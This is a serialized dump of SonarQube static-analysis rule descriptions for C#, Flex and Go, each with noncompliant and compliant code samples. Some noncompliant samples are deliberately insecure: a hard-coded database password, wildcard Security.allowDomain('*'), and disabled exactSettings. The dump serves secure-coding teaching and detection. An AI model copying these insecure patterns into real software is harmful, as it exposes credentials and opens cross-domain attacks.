  <li> <code>System.Net</code> namespace
    <ul>
      <li> <code>System.Net.WebClient</code> </li>
    </ul> </li>
  <li> <code>System.Net.Sockets</code> namespace
    <ul>
      <li> <code>System.Net.Sockets.Socket</code> </li>
      <li> <code>System.Net.Sockets.TcpClient</code> </li>
      <li> <code>System.Net.Sockets.UdpClient</code> </li>
    </ul> </li>
  <li> <code>System.Drawing</code> namespace
    <ul>
      <li> <code>System.Drawing.Image</code> </li>
      <li> <code>System.Drawing.Bitmap</code> </li>
    </ul> </li>
</ul>
<p>which are either instantiated directly using the <code>new</code> operator, or using one of the following factory methods:</p>
<ul>
  <li> <code>System.IO.File.Create()</code> </li>
  <li> <code>System.IO.File.Open()</code> </li>
  <li> <code>System.Drawing.Image.FromFile()</code> </li>
  <li> <code>System.Drawing.Image.FromStream()</code> </li>
</ul>
<p>on both private fields and local variables.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class ResourceHolder
{
  private FileStream fs; // Noncompliant; Dispose or Close are never called

  public void OpenResource(string path)
  {
    this.fs = new FileStream(path, FileMode.Open);
  }

  public void WriteToFile(string path, string text)
  {
    var fs = new FileStream(path, FileMode.Open); // Noncompliant
    var bytes = Encoding.UTF8.GetBytes(text);
    fs.Write(bytes, 0, bytes.Length);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class ResourceHolder : IDisposable
{
  private FileStream fs;

  public void OpenResource(string path)
  {
    this.fs = new FileStream(path, FileMode.Open);
  }

  public void Dispose()
  {
    this.fs.Dispose();
  }

  public void WriteToFile(string path, string text)
  {
    using (var fs = new FileStream(path, FileMode.Open))
    {
      var bytes = Encoding.UTF8.GetBytes(text);
      fs.Write(bytes, 0, bytes.Length);
    }
  }
}
</pre>
<h2>Exceptions</h2>
<p><code>IDisposable</code> variables returned from a method or passed to other methods are ignored, as are local <code>IDisposable</code>s that are
initialized with other <code>IDisposable</code>s.</p>
<pre>
public Stream WriteToFile(string path, string text)
{
  var fs = new FileStream(path, FileMode.Open); // Compliant, because it is returned
  var bytes = Encoding.UTF8.GetBytes(text);
  fs.Write(bytes, 0, bytes.Length);
  return fs;
}

public void ReadFromStream(Stream s)
{
  var sr = new StreamReader(s); // Compliant as it would close the underlying stream.
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/459.html">MITRE, CWE-459</a> - Incomplete Cleanup </li>
</ul>ZBUG
—
csharpsquid:S3464ª
csharpsquidS3464(Type inheritance should not be recursive"BLOCKER*cs:Ë<p>Recursion is acceptable in methods, where you can break out of it. But with class types, you end up with code that will compile but not run if you
try to instantiate the class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class C1&lt;T&gt;
{
}
class C2&lt;T&gt; : C1&lt;C2&lt;C2&lt;T&gt;&gt;&gt; // Noncompliant
{
}

...
var c2 = new C2&lt;int&gt;();
</pre>ZBUG
ç
csharpsquid:S2931˜
csharpsquidS2931AClasses with "IDisposable" members should implement "IDisposable""BLOCKER*cs:ã<p>An <code>IDisposable</code> object should be disposed (there are some rare exceptions where not disposing is fine, most notably <code>Task</code>).
If a class has an <code>IDisposable</code> field, there can be two situations:</p>
<p>- The class observes a field that it under the responsibility of another class. </p>
<p>- The class owns the field, and is therefore responsible for calling <code>Dispose</code> on it.</p>
<p>In the second case, the safest way for the class to ensure <code>Dispose</code> is called is to call it in its own <code>Dispose</code> function,
and therefore to be itself <code>IDisposable</code>. A class is considered to own an <code>IDisposable</code> field resource if it created the object
referenced by the field.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class ResourceHolder   // Noncompliant; doesn't implement IDisposable
{
  private FileStream fs;  // This member is never Disposed
  public void OpenResource(string path)
  {
    this.fs = new FileStream(path, FileMode.Open); // I create the FileStream, I'm owning it
  }
  public void CloseResource()
  {
    this.fs.Close();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class ResourceHolder : IDisposable
{
&nbsp;&nbsp;private FileStream fs;
&nbsp;&nbsp;public void OpenResource(string path)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;this.fs = new FileStream(path, FileMode.Open); // I create the FileStream, I'm owning it
&nbsp;&nbsp;}
&nbsp;&nbsp;public void CloseResource()
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;this.fs.Close();
&nbsp;&nbsp;}

&nbsp;&nbsp;public void Dispose()
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;this.fs.Dispose();
&nbsp;&nbsp;}
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/459.html">MITRE, CWE-459</a> - Incomplete Cleanup </li>
</ul>ZBUG

csharpsquid:S2187⁄
csharpsquidS2187TestCases should contain tests"BLOCKER*cs:ä<p>There's no point in having a test class without any test methods.This could lead a maintainer to assume a class is covered by tests even though it
is not.</p>
<p>Supported test frameworks are <code>NUnit</code> and <code>MSTest</code> (not applicable to <code>xUnit</code>).</p>
<p>This rule will raise an issue when any of these conditions are met:</p>
<ul>
  <li> For <strong>NUnit</strong>, a class is marked with <code>TestFixture</code> but does not contain any method marked with <code>Test</code>,
  <code>TestCase</code>, <code>TestCaseSource</code> or <code>Theory</code>. </li>
  <li> For <strong>MSTest</strong>, a class is marked with <code>TestClass</code> but does not contain any method marked with <code>TestMethod</code>
  or <code>DataTestMethod</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
[TestFixture]
public class SomeClassTest { } // Noncompliant - no test

[TestClass]
public class SomeOtherClassTest { } // Noncompliant - no test
</pre>
<h2>Compliant Solution</h2>
<pre>
[TestFixture]
public class SomeClassTest
{
    [Test]
    public void SomeMethodShouldReturnTrue() { }
}

[TestClass]
public class SomeOtherClassTest
{
    [TestMethod]
    public void SomeMethodShouldReturnTrue() { }
}
</pre>
<h2>Exceptions</h2>
<ul>
  <li> abstract classes </li>
  <li> derived classes that inherit from a base class that does have test methods </li>
  <li> in <strong>MSTest</strong>, classes that contain methods marked with either <code>AssemblyInitialize</code> or <code>AssemblyCleanup</code>.
  </li>
</ul>Z
CODE_SMELL
Õ
csharpsquid:S2190∑
csharpsquidS2190 Recursion should not be infinite"BLOCKER*cs:Ï<p>Recursion happens when control enters a loop that has no exit. This can happen a method invokes itself, when a pair of methods invoke each other,
or when <code>goto</code> statements are used to move between two segments of code. It can be a useful tool, but unless the method includes a
provision to break out of the recursion and <code>return</code>, the recursion will continue until the stack overflows and the program crashes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int Pow(int num, int exponent)   // Noncompliant; no condition under which pow isn't re-called
{
  num = num * Pow(num, exponent-1);
  return num;  // this is never reached
}

void InternalRecursion(int i)
{
  start:
    goto end;
  end:
    goto start; // Noncompliant; there's no way to break out of this method
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int Pow(int num, int exponent)
{
  if (exponent &gt; 1) // recursion now conditional and stop-able
  {
    num = num * Pow(num, exponent-1);
  }
  return num;
}
</pre>ZBUG
è
csharpsquid:S4462˘
csharpsquidS4462/Calls to "async" methods should not be blocking"BLOCKER*cs:ò<p>Making blocking calls to <code>async</code> methods transforms something that was intended to be asynchronous into a synchronous block. Doing so
can cause deadlocks and unexpected blocking of context threads.</p>
<p>According to the MSDN documentation:</p>
<blockquote>
  <p>The root cause of this deadlock is due to the way <code>await</code> handles contexts. By default, when an incomplete <code>Task</code> is
  awaited, the current ‚Äúcontext‚Äù is captured and used to resume the method when the <code>Task</code> completes. This ‚Äúcontext‚Äù is the current
  <code>SynchronizationContext</code> unless it‚Äôs null, in which case it‚Äôs the current <code>TaskScheduler</code>. GUI and ASP.NET applications have a
  <code>SynchronizationContext</code> that permits only one chunk of code to run at a time. When the <code>await</code> completes, it attempts to
  execute the remainder of the <code>async</code> method within the captured context. But that context already has a thread in it, which is
  (synchronously) waiting for the <code>async</code> method to complete. They‚Äôre each waiting for the other, causing a deadlock.</p>
</blockquote>
<table>
  <tbody>
    <tr>
      <th>To Do This ‚Ä¶</th>
      <th>Instead of This ‚Ä¶</th>
      <th>Use This</th>
    </tr>
    <tr>
      <td>Retrieve the result of a background task</td>
      <td><code>Task.Wait</code>, <code>Task.Result</code> or <code>Task.GetAwaiter.GetResult</code></td>
      <td><code>await</code></td>
    </tr>
    <tr>
      <td>Wait for any task to complete</td>
      <td><code>Task.WaitAny</code></td>
      <td><code>await Task.WhenAny</code></td>
    </tr>
    <tr>
      <td>Retrieve the results of multiple tasks</td>
      <td><code>Task.WaitAll</code></td>
      <td><code>await Task.WhenAll</code></td>
    </tr>
    <tr>
      <td>Wait a period of time</td>
      <td><code>Thread.Sleep</code></td>
      <td><code>await Task.Delay</code></td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
public static class DeadlockDemo
{
    private static async Task DelayAsync()
    {
        await Task.Delay(1000);
    }

    // This method causes a deadlock when called in a GUI or ASP.NET context.
    public static void Test()
    {
        // Start the delay.
        var delayTask = DelayAsync();
        // Wait for the delay to complete.
        delayTask.Wait(); // Noncompliant
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static class DeadlockDemo
{
    private static async Task DelayAsync()
    {
        await Task.Delay(1000);
    }

    public static async Task TestAsync()
    {
        // Start the delay.
        var delayTask = DelayAsync();
        // Wait for the delay to complete.
        await delayTask;
    }
}
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Main methods of Console Applications are not subject to this deadlock issue and so are ignored by this rule. </li>
  <li> <code>Thread.Sleep</code> is also ignored when it is used in a non-<code>async</code> method. </li>
  <li> Calls chained after <code>Task.Run</code> or <code>Task.Factory.StartNew</code> are ignored because they don't suffer from this deadlock issue
  </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://msdn.microsoft.com/en-us/magazine/jj991977.aspx">Async/Await - Best Practices in Asynchronous Programming</a> </li>
</ul>Z
CODE_SMELL
Ã
csharpsquid:S2178∂
csharpsquidS21786Short-circuit logic should be used in boolean contexts"BLOCKER*cs:Œ<p>The use of non-short-circuit logic in a boolean context is likely a mistake - one that could cause serious program errors as conditions are
evaluated under the wrong circumstances. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if (GetTrue() | GetFalse()) // Noncompliant; both sides evaluated
{
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (GetTrue() || GetFalse()) // true short-circuit logic
{
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/g4FtAg">CERT, EXP46-C.</a> - Do not use a bitwise operator with a Boolean-like operand
  </li>
</ul>Z
CODE_SMELL
”
csharpsquid:S2857Ω
csharpsquidS2857.SQL keywords should be delimited by whitespace"BLOCKER*cs:‰<p>Badly formed SQL is likely to cause errors at runtime.</p>
<p>This rule raises an issue when the spacing around SQL keywords appears to be missing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
string select = "SELECT p.fname, p.lname, p.street1, p.street2, p.city, p.state, p.zip" +
        "FROM person p" +  // Noncompliant; concatenates to: p.zipFROM
        "WHERE p.id = @ID";  // Noncompliant; concatenates to: pWHERE
</pre>
<h2>Compliant Solution</h2>
<pre>
string select = "SELECT p.fname, p.lname, p.street1, p.street2, p.city, p.state, p.zip" +
    " FROM person p" +
    " WHERE p.id = @ID";
</pre>ZBUG
œ
csharpsquid:S3875π
csharpsquidS38758"operator==" should not be overloaded on reference types"BLOCKER*cs:œ<p>The use of <code>==</code> to compare to objects is expected to do a reference comparison. That is, it is expected to return <code>true</code> if
and only if they are the same object instance. Overloading the operator to do anything else will inevitably lead to the introduction of bugs by
callers. On the other hand, overloading it to do exactly that is pointless; that's what <code>==</code> does by default.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public static bool operator== (MyType x, MyType y) // Noncompliant
{
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Classes with overloaded <code>operator +</code> or <code>operator -</code> methods are ignored. </li>
  <li> Classes that implement <code>IComparable&lt;T&gt;</code> or <code>IEquatable&lt;T&gt;</code> most probably behave as a value-type objects and
  so are ignored. </li>
</ul>Z
CODE_SMELL
√
csharpsquid:S1451≠
csharpsquidS1451+Track lack of copyright and license headers"BLOCKER*cs:–<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>
<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>
<p>The <code>headerFormat</code> must end with an empty line if you want to have an empty line between the file header and the first line for your
source file (<code>using</code>, <code>namespace</code>...).</p>
<p>For example, if you want the source file to look like this</p>
<pre>
// Copyright (c) SonarSource. All Rights Reserved. Licensed under the LGPL License.  See License.txt in the project root for license information.

namespace Foo
{
}
</pre>
<p>then the <code>headerFormat</code> parameter should end with an empty line like this</p>
<pre>
// Copyright (c) SonarSource. All Rights Reserved. Licensed under the LGPL License.  See License.txt in the project root for license information.

</pre>
<h2>Compliant Solution</h2>
<pre>
/*
 * SonarQube, open source software quality management tool.
 * Copyright (C) 2008-2013 SonarSource
 * mailto:contact AT sonarsource DOT com
 *
 * SonarQube is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 3 of the License, or (at your option) any later version.
 *
 * SonarQube is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */
</pre>Z
CODE_SMELL
û
csharpsquid:S2306à
csharpsquidS23065"async" and "await" should not be used as identifiers"BLOCKER*cs:°<p>Since C# 5.0, <code>async</code> and <code>await</code> are contextual keywords. Contextual keywords do have a particular meaning in some contexts,
but can still be used as variable names. Keywords, on the other hand, are always reserved, and therefore are not valid variable names. To avoid any
confusion though, it is best to not use <code>async</code> and <code>await</code> as identifiers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int await = 42; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int someOtherName = 42;
</pre>Z
CODE_SMELL
∂

csharpsquid:S3877†

csharpsquidS38777Exceptions should not be thrown from unexpected methods"BLOCKER*cs:∑	<p>It is expected that some methods should be called with caution, but others, such as <code>ToString</code>, are expected to "just work". Throwing an
exception from such a method is likely to break callers' code unexpectedly.</p>
<p>An issue is raised when an exception is thrown from any of the following: </p>
<ul>
  <li> Event accessors </li>
  <li> <code>Object.Equals</code> </li>
  <li> <code>IEquatable.Equals</code> </li>
  <li> <code>GetHashCode</code> </li>
  <li> <code>ToString</code> </li>
  <li> <code>static</code> constructors </li>
  <li> <code>IDisposable.Dispose</code> </li>
  <li> <code>operator ==, !=, &lt;, &gt;, &lt;=, &gt;=</code> </li>
  <li> <code>implicit</code> cast operators </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public override string ToString()
{
  if (string.IsNullOrEmpty(Name))
  {
    throw new ArgumentException("...");  // Noncompliant
  }
  //...
</pre>
<h2>Exceptions</h2>
<p><code>System.NotImplementedException</code> and its derivatives are ignored.</p>
<p><code>System.InvalidOperationException</code>, <code>System.NotSupportedException</code>, and <code>System.ArgumentException</code> and their
derivatives are ignored in event accessors.</p>Z
CODE_SMELL
Õ
csharpsquid:S3884∑
csharpsquidS3884A"CoSetProxyBlanket" and "CoInitializeSecurity" should not be used"BLOCKER*cs:¡<p><code>CoSetProxyBlanket</code> and <code>CoInitializeSecurity</code> both work to set the permissions context in which the process invoked
immediately after is executed. Calling them from within that process is useless because it's too late at that point; the permissions context has
already been set.</p>
<p>Specifically, these methods are meant to be called from non-managed code such as a C++ wrapper that then invokes the managed, i.e. C# or VB.NET,
code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
[DllImport("ole32.dll")]
static extern int CoSetProxyBlanket([MarshalAs(UnmanagedType.IUnknown)]object pProxy, uint dwAuthnSvc, uint dwAuthzSvc,
	[MarshalAs(UnmanagedType.LPWStr)] string pServerPrincName, uint dwAuthnLevel, uint dwImpLevel, IntPtr pAuthInfo,
	uint dwCapabilities);

public enum RpcAuthnLevel
{
	Default = 0,
	None = 1,
	Connect = 2,
	Call = 3,
	Pkt = 4,
	PktIntegrity = 5,
	PktPrivacy = 6
}

public enum RpcImpLevel
{
	Default = 0,
	Anonymous = 1,
	Identify = 2,
	Impersonate = 3,
	Delegate = 4
}

public enum EoAuthnCap
{
	None = 0x00,
	MutualAuth = 0x01,
	StaticCloaking = 0x20,
	DynamicCloaking = 0x40,
	AnyAuthority = 0x80,
	MakeFullSIC = 0x100,
	Default = 0x800,
	SecureRefs = 0x02,
	AccessControl = 0x04,
	AppID = 0x08,
	Dynamic = 0x10,
	RequireFullSIC = 0x200,
	AutoImpersonate = 0x400,
	NoCustomMarshal = 0x2000,
	DisableAAA = 0x1000
}

[DllImport("ole32.dll")]
public static extern int CoInitializeSecurity(IntPtr pVoid, int cAuthSvc, IntPtr asAuthSvc, IntPtr pReserved1,
	RpcAuthnLevel level, RpcImpLevel impers, IntPtr pAuthList, EoAuthnCap dwCapabilities, IntPtr pReserved3);

static void Main(string[] args)
{
	var hres1 = CoSetProxyBlanket(null, 0, 0, null, 0, 0, IntPtr.Zero, 0); // Noncompliant

	var hres2 = CoInitializeSecurity(IntPtr.Zero, -1, IntPtr.Zero, IntPtr.Zero, RpcAuthnLevel.None,
		RpcImpLevel.Impersonate, IntPtr.Zero, EoAuthnCap.None, IntPtr.Zero); // Noncompliant
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
</ul>ZVULNERABILITY
¸
csharpsquid:S3889Ê
csharpsquidS3889;Neither "Thread.Resume" nor "Thread.Suspend" should be used"BLOCKER*cs:Ä<p><code>Thread.Suspend</code> and <code>Thread.Resume</code> can give unpredictable results, and both methods have been deprecated. Indeed, if
<code>Thread.Suspend</code> is not used very carefully, a thread can be suspended while holding a lock, thus leading to a deadlock. Other safer
synchronization mechanisms should be used, such as <code>Monitor</code>, <code>Mutex</code>, and <code>Semaphore</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
static void Main(string[] args)
{
  // ...
  Thread.CurrentThread.Suspend(); // Noncompliant
  Thread.CurrentThread.Resume(); // Noncompliant
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://msdn.microsoft.com/en-us/library/system.threading.thread.resume.aspx">Thread.Resume Method ()</a> </li>
  <li> <a href="https://msdn.microsoft.com/en-us/library/system.threading.thread.suspend(v=vs.110).aspx">Thread.Suspend Method ()</a> </li>
</ul>ZBUG
é
csharpsquid:S2437¯
csharpsquidS2437,Silly bit operations should not be performed"BLOCKER*cs:ö<p>Certain bit operations are just silly and should not be performed because their results are predictable.</p>
<p>Specifically, using <code>&amp; -1</code> with any value will always result in the original value, as will <code>anyValue ^ 0</code> and
<code>anyValue | 0</code>.</p>Z
CODE_SMELL
¢
csharpsquid:S4159å
csharpsquidS4159;Classes should implement their "ExportAttribute" interfaces"BLOCKER*cs:¶<p>In the Attributed Programming Model, the <code>ExportAttribute</code> declares that a part "exports", or provides to the composition container, an
object that fulfills a particular contract. During composition, parts with imports that have matching contracts will have those dependencies filled by
the exported object.</p>
<p>If the type doesn't implement the interface it is exporting there will be an issue at runtime (either a cast exception or just a container not
filled with the exported type) leading to unexpected behaviors/crashes.</p>
<p>The rule raises an issue when a class doesn't implement or inherit the type declared in the <code>ExportAttribute</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
[Export(typeof(ISomeType))]
public class SomeType // Noncompliant; doesn't implement 'ISomeType'.
{
}
</pre>
<h2>Compliant Solution</h2>
<pre>
[Export(typeof(ISomeType))]
public class SomeType : ISomeType
{
}
</pre>ZBUG
“
csharpsquid:S3869º
csharpsquidS38694"SafeHandle.DangerousGetHandle" should not be called"BLOCKER*cs:›<p>Not surprisingly, the <code>SafeHandle.DangerousGetHandle</code> method is dangerous. That's because it may not return a valid handle. Using it can
lead to leaks and vulnerabilities. While it is possible to use the method successfully, it's extremely difficult to do correctly, so the method should
simply be avoided altogether.</p>
<h2>Noncompliant Code Example</h2>
<pre>
static void Main(string[] args)
{
    System.Reflection.FieldInfo fieldInfo = ...;
    SafeHandle handle = (SafeHandle)fieldInfo.GetValue(rKey);
    IntPtr dangerousHandle = handle.DangerousGetHandle();  // Noncompliant
}
</pre>ZBUG
˝
csharpsquid:S3060Á
csharpsquidS3060#"is" should not be used with "this""BLOCKER*cs:í<p>There's no valid reason to test <code>this</code> with <code>is</code>. The only plausible explanation for such a test is that you're executing
code in a parent class conditionally based on the kind of child class <code>this</code> is. But code that's specific to a child class should be
<em>in</em> that child class, not in the parent.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class JunkFood
{
  public void DoSomething()
  {
    if (this is Pizza) // Noncompliant
    {
      // ...
    } else if (...
  }
}
</pre>Z
CODE_SMELL
Û	

flex:S1451‰	
flexS1451+Track lack of copyright and license headers"BLOCKER*flex:å	<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>
<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>
<h2>Compliant Solution</h2>
<pre>
/*
 * SonarQube, open source software quality management tool.
 * Copyright (C) 2008-2013 SonarSource
 * mailto:contact AT sonarsource DOT com
 *
 * SonarQube is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 3 of the License, or (at your option) any later version.
 *
 * SonarQube is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */
</pre>Z
CODE_SMELL
Ü

flex:S1466˜
flexS1466MThe flash.system.Security.exactSettings property should never be set to false"BLOCKER*flex:˙<p>The Security.exactSettings value should remain set at the default value of true. Setting this value to false could make the SWF vulnerable to
cross-domain attacks.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Security.exactSettings = false;
</pre>ZVULNERABILITY
’

flex:S1469∆
flexS14696The element type of an array field should be specified"BLOCKER*flex:„<p>Quoted from the Flex documentation :</p>
<blockquote>
  <p>When you define an Array variable in ActionScript, you specify Array as the data type of the variable. However, you cannot specify the data type
  of the elements of the Array.</p>
  <p>To allow the Flex MXML compiler to perform type checking on Array elements, you can use the [ArrayElementType] metadata tag to specify the
  allowed data type of the Array elements.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
public var newStringProperty:Array;
public var newNumberProperty:Array;
</pre>
<h2>Compliant Solution</h2>
<pre>
[ArrayElementType("String")]
public var newStringProperty:Array;

[ArrayElementType("Number")]
public var newNumberProperty:Array;
</pre>Z
CODE_SMELL
ß

flex:S1468ò
flexS1468ISecurity.allowDomain(...) should only be used in a tightly focused manner"BLOCKER*flex:ü<p>Calling Security.allowDomain("*") lets any domain cross-script into the domain of this SWF and exercise its functionality.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Security.allowDomain("*");
</pre>
<h2>Compliant Solution</h2>
<pre>
Security.allowDomain("www.myDomain.com");
</pre>ZVULNERABILITY
¸

flex:S1314Ì
flexS1314Octal values should not be used"BLOCKER*flex:°<p>Integer literals starting with a zero are octal rather than decimal values. While using octal values is fully supported, most developers do not
have experience with them. They may not recognize octal values as such, mistaking them instead for decimal values.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var myNumber:int = 010;  // Noncompliant. myNumber will hold 8, not 10 - was this really expected?
</pre>
<h2>Compliant Solution</h2>
<pre>
var myNumber:int = 8;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/_QC7AQ">CERT, DCL18-C.</a> - Do not begin integer constants with 0 when specifying a
  decimal value </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/hYClBg">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>
</ul>Z
CODE_SMELL
ƒ
flex:NonEmptyCaseWithoutBreak¢
flexNonEmptyCaseWithoutBreak?Switch cases should end with an unconditional "break" statement"BLOCKER*flex:£<p>When the execution is not explicitly terminated at the end of a switch case, it continues to execute the statements of the following case. While
this is sometimes intentional, it often is a mistake which leads to unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (myVariable) {
  case 1:
    foo();
    break;
  case 2:  // Both 'doSomething()' and 'doSomethingElse()' will be executed. Is it on purpose ?
    doSomething();
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (myVariable) {
  case 1:
    foo();
    break;
  case 2:
    doSomething();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Exceptions</h2>
<p>This rule is relaxed in the following cases:</p>
<pre>
switch (myVariable) {
  case 0: // Empty case used to specify the same behavior for a group of cases.
  case 1:
    doSomething();
    break;
  case 2: // Use of return statement
    return;
  case 3: // Use of throw statement
    throw new IllegalStateException();
  case 4: // Use of continue statement
    continue;
  default: // For the last case, use of break statement is optional
    doSomethingElse();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/484.html">MITRE, CWE-484</a> - Omitted Break Statement in Switch </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YIFLAQ">CERT, MSC17-C.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ewHAAQ">CERT, MSC52-J.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
</ul>Z
CODE_SMELL
•

flex:S1446ñ
flexS1446"Dynamic classes should not be used"BLOCKER*flex:«<p>A dynamic class defines an object that can be altered at run time by adding or changing properties and methods. This extremely powerful mechanism
should be used very carefully, and only in very limited use cases. </p>
<p>Indeed, by definition dynamic classes make refactoring difficult and prevent the compiler from raising potential errors at compile time. </p>
<h2>Noncompliant Code Example</h2>
<pre>
dynamic public class DynamicFoo
{...}
</pre>
<p> </p>
<h2>Compliant Solution</h2>
<pre>
public class Foo  //Note that the class has been renamed to avoid confusion
{...}
</pre>Z
CODE_SMELL
”
go:S2068∆
goS2068$Credentials should not be hard-coded"BLOCKER*go:ˆ<p>Because it is easy to extract strings from a compiled application, credentials should never be hard-coded. Do so, and they're almost guaranteed to
end up in the hands of an attacker. This is particularly true for applications that are distributed.</p>
<p>Credentials should be stored outside of the code in a strongly-protected encrypted configuration file or database.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It's recommended to customize the configuration of this rule with additional credential words such as "oauthToken", "secret", ...</p>
<h2>Noncompliant Code Example</h2>
<pre>
func connect()  {
  user := "root"
  password:= "supersecret" // Noncompliant

  url := "login=" + user + "&amp;passwd=" + password
}
</pre>
<h2>Compliant Solution</h2>
<pre>
func connect()  {
  user := getEncryptedUser()
  password:= getEncryptedPass() // Compliant

  url := "login=" + user + "&amp;passwd=" + password
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/798">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/259">MITRE, CWE-259</a> - Use of Hard-coded Password </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/qQCHAQ">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>ZVULNERABILITY
Ì	
go:S1451‡	
goS1451+Track lack of copyright and license headers"BLOCKER*go:å	<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>
<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>
<h2>Compliant Solution</h2>
<pre>
/*
 * SonarQube, open source software quality management tool.
 * Copyright (C) 2008-2013 SonarSource
 * mailto:contact AT sonarsource DOT com
 *
 * SonarQube is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 3 of the License, or (at your option) any later version.
 *
 * SonarQube is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */
</pre>Z
CODE_SMELL
æ
go:S1314±
goS1314Octal values should not be used"BLOCKER*go:È<p>Integer literals starting with a zero are octal rather than decimal values. While using octal values is fully supported, most developers do not
have experience with them. They may not recognize octal values as such, mistaking them instead for decimal values.</p>
<h2>Noncompliant Code Example</h2>
<pre>
func printTen() {
	myNumber := 010 // Noncompliant. myNumber will hold 8, not 10 - was this really expected?
	fmt.Println(myNumber)
}
</pre>
<h2>Compliant Solution</h2>
<pre>
func printTen() {
	myNumber := 10
	fmt.Println(myNumber)
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/_QC7AQ">CERT, DCL18-C.</a> - Do not begin integer constants with 0 when specifying a
  decimal value </li>
